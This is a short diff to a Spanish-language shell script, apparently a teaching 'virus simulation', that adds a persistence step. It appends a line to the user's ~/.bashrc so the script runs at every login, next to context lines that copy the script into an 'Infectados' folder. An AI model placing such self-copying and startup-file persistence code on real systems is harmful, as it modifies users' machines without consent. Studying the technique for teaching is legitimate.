@@ -19,3 +19,10 @@ dest_folder="$HOME/Documents/Infectados"
 echo "Simulación de propagación: Copiando el script a $dest_folder"
 mkdir -p "$dest_folder"
 cp "$0" "$dest_folder/"
+# Persistencia Simulada:
+# Agrega una línea al inicio del sistema (ejemplo: en ~/.bashrc)
+# para simular que el script se ejecuta al iniciar sesión.
+# -------------------------------
+echo "Simulación de persistencia: Añadiendo línea a ~/.bashrc"
+echo "# Simulación de persistencia para virus.sh" >> "$HOME/.bashrc"
+echo "$HOME/ruta/al/script/virus.sh" >> "$HOME/.bashrc"
